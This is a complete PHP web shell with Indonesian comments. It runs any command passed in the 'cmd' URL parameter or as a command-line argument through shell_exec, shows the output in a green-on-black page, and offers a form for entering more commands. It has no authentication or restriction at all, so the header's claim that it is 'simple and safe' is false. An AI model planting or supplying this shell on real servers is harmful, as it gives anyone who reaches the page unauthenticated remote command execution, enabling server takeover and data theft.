<?php
// === SHELL SEDERHANA & AMAN ===
// Bisa via: ?cmd=whoami
// Atau CLI: $argv[1]

$cmd = $_GET['cmd'] ?? ($argv[1] ?? '');

if (empty($cmd)) {
    echo '<!DOCTYPE html><html><head><title>Shell</title>
    <style>body{font-family:Consolas;background:#111;color:#0f0;margin:20px;}
    input,button{padding:12px;font-size:16px;}input{width:70%;}button{background:#0f0;color:#000;border:none;cursor:pointer;}
    button:hover{background:#0c0;}</style></head><body>
    <h2>Web Shell</h2>
    <form><input name="cmd" placeholder="masukkan perintah..." autofocus><button>Run</button></form><hr>';
    exit;
}

echo '<pre style="background:#000;color:#0f0;padding:15px;border:1px solid #0f0;border-radius:5px;">';
echo htmlspecialchars(shell_exec($cmd));
echo '</pre>';
echo '<hr><a href="?" style="color:#0f0;">Kembali</a>';
?>
